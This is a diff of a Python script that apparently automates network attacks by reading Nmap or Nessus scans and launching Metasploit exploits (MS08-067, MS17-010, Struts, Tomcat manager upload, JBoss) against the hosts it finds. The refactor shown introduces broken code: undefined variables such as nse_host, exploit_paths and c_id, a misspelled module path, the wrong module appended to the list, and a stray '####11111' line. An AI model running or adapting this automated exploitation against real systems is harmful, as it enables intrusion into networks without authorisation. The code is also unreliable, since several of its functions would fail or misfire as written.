@@ -52,6 +52,36 @@ def run_proc(cmd):
 
     return proc
 
+def get_iface():
+    '''
+    Gets the right interface for Responder
+    '''
+    try:
+        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
+    except:
+        ifaces = []
+        for iface in netifaces.interfaces():
+            # list of ipv4 addrinfo dicts
+            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
+
+            for entry in ipv4s:
+                addr = entry.get('addr')
+                if not addr:
+                    continue
+                if not (iface.startswith('lo') or addr.startswith('127.')):
+                    ifaces.append(iface)
+
+        iface = ifaces[0]
+
+    return iface
+
+def get_local_ip(iface):
+    '''
+    Gets the the local IP of an interface
+    '''
+    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
+    return ip
+
 def get_exploitable_hosts(report):
     '''
     Parses .nessus files for vulnerabilities that metasploit can exploit
@@ -227,36 +257,6 @@ def check_named_pipes(c_id, ip, nmap_os):
             pipes = l.split(delim)[1].split(', ')
 
     return pipes
-
-def get_iface():
-    '''
-    Gets the right interface for Responder
-    '''
-    try:
-        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
-    except:
-        ifaces = []
-        for iface in netifaces.interfaces():
-            # list of ipv4 addrinfo dicts
-            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
-
-            for entry in ipv4s:
-                addr = entry.get('addr')
-                if not addr:
-                    continue
-                if not (iface.startswith('lo') or addr.startswith('127.')):
-                    ifaces.append(iface)
-
-        iface = ifaces[0]
-
-    return iface
-
-def get_local_ip(iface):
-    '''
-    Gets the the local IP of an interface
-    '''
-    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
-    return ip
 
 def create_msf_cmd(module_path, rhost_var, ip, port, payload, extra_opts):
     '''
@@ -479,44 +479,26 @@ def run_nmap_exploits(c_id, hosts, nse_hosts):
     '''
     Checks for exploitable services on a host
     '''
+    # These are for host scripts and service script vulns
     for nse_host in nse_hosts:
+        check_host_scripts(c_id, nse_host)
+        check_service_scripts(c_id, nse_host)
 
-        # Check for host script results
-        ms08_vuln = check_nse_host_scripts(nse_host, 'smb-vuln-ms08-067')
-        if ms08_vuln:
-            mod = 'exploit/windows/smb/ms08_067_netapi'
-            port = '445'
-            mod_out = run_msf_module(c_id, nse_host, mod, port, '')
-
-        ms17_vuln = check_nse_host_scripts(nse_host, 'smb-vuln-ms17-010')
-        if ms17_vuln:
-            mod_out = run_ms17(c_id, nse_host)
-
-        # Check for service script results
-        for s in nse_host.services:
-            if s.open():
-                port = str(s.port)
-                for script in s.scripts_results:
-                    if script['id'] == 'http-title':
-                        script_out = script['output']
-                        tomcat_vuln = is_tomcat_jsp_upload_vuln(script_out)
-                        if tomcat_vuln:
-                            mod = 'expoit/multi/http/tomcat_mgr_deploy'
-                            mod_out = run_msf_module(c_id, nse_host, mod, port, '')
-
-    # These are the regular first Nmap hosts, no scripts
+    # These are the regular first Nmap hosts service output, no scripts
     for host in hosts:
-        for s in host.services:
-            if s.open():
-                port = str(s.port)
-                # Can Struts be run without Tomcat? Maybe, but seems really rare
-                if 'Apache Tomcat/Coyote JSP engine' in s.banner:
-                    # Struts DMI REST exec
-                    struts_mod = 'exploit/multi/http/struts_dmi_rest_exec'
-                    mod_out = run_msf_module(c_id, host, struts_mod, port, '')
-                    # Tomcat manager upload with default creds
-                    tomcat_mgr_mod = 'exploit/multi/http/tomcat_mgr_upload'
-                    mod_out = run_msf_module(c_id, host, tomcat_mgr_mod, port, '')
+        check_nmap_services(c_id, host)
+
+def check_host_scripts(c_id, host):
+    # Check for host script results
+    ms08_vuln = check_nse_host_scripts(nse_host, 'smb-vuln-ms08-067')
+    if ms08_vuln:
+        mod = 'exploit/windows/smb/ms08_067_netapi'
+        port = '445'
+        mod_out = run_msf_module(c_id, nse_host, mod, port, '')
+
+    ms17_vuln = check_nse_host_scripts(nse_host, 'smb-vuln-ms17-010')
+    if ms17_vuln:
+        mod_out = run_ms17(c_id, nse_host)
 
 def check_nse_host_scripts(host, script):
     '''
@@ -532,6 +514,59 @@ def check_nse_host_scripts(host, script):
                 return True
 
     return False
+
+def check_service_scripts(c_id, host):
+    for s in nse_host.services:
+        if s.open():
+            port = str(s.port)
+            for script in s.scripts_results:
+                if script['id'] == 'http-title':
+                    script_out = script['output']
+                    tomcat_vuln = is_tomcat_jsp_upload_vuln(script_out)
+                    if tomcat_vuln:
+                        mod = 'expoit/multi/http/tomcat_mgr_deploy'
+                        mod_out = run_msf_module(c_id, nse_host, mod, port, '')
+
+def check_nmap_services(c_id, host):
+    '''
+    Checks Nmap service banners for potential vulnerabilities
+    '''
+    mods = []
+
+    for s in host.services:
+        if s.open():
+            port = str(s.port)
+
+            if 'Apache Tomcat/Coyote JSP engine' in s.banner:
+
+                # Struts DMI REST exec
+                # Can Struts be run without Tomcat? Maybe, but seems really rare
+                struts_mod = 'exploit/multi/http/struts_dmi_rest_exec'
+                exploit_paths.append(struts_mod)
+
+                # Tomcat manager upload with default creds
+                tomcat_mgr_mod = 'exploit/multi/http/tomcat_mgr_upload'
+                mods.append(struts_mod)
+
+                # JBoss
+                jboss_mods = check_for_jboss_vulns(port, host)
+                if jboss_mods:
+                    mods += jboss_mods
+
+    for mod in mods:
+        mod_out = run_msf_module(c_id, host, mod, port, '')
+
+def check_for_jboss_vulns(port, host):
+    '''
+    Checks if page is runing vulnerable JBoss
+    '''
+    ####11111
+    jboss_mods = None
+    jboss_vuln_scan = 'auxiliary/scanner/http/jboss_vulnscan'
+    mod_out = run_msf_module(c_id, host, mod, port, '')
+
+    return jboss_mods
+
 
 def run_msf_module(c_id, host, mod, port, extra_opts):
     ip = host.address
@@ -657,17 +692,6 @@ def main(report, args):
         run_nmap_exploits(c_id, hosts, nse_hosts)
         remainder_output = wait_on_busy_console(c_id)
 
-if __name__ == "__main__":
-    args = parse_args()
-    if os.geteuid():
-        print_bad('Run as root')
-        sys.exit()
-    if args.nessus:
-        report = NessusParser.parse_fromfile(args.nessus)
-    else:
-        report = parse_nmap(args)
-    main(report, args)
-
 def jsp_upload_bypass_tomcat_vers():
     return ['9.0.0', '8.5.1',  '8.5.2', '8.5.3', 
             '8.5.4', '8.5.5', '8.5.6', '8.5.7', 
@@ -709,7 +733,17 @@ def jsp_upload_bypass_tomcat_vers():
             '7.0.78','7.0.79','7.0.80','7.0.81']
 
 
+
+if __name__ == "__main__":
+    args = parse_args()
+    if os.geteuid():
+        print_bad('Run as root')
+        sys.exit()
+    if args.nessus:
+        report = NessusParser.parse_fromfile(args.nessus)
+    else:
+        report = parse_nmap(args)
+    main(report, args)
+
 #TODO
-# Make Nmap smarter so it only runs NSE scripts that haven't already been ran
-# Add nmap http-title reader to determine if tomcat is vuln version
-# Add JBoss, Struts, Tomcat, Jenkins, WebSphere
+# Add JBoss, Tomcat, Jenkins, WebSphere
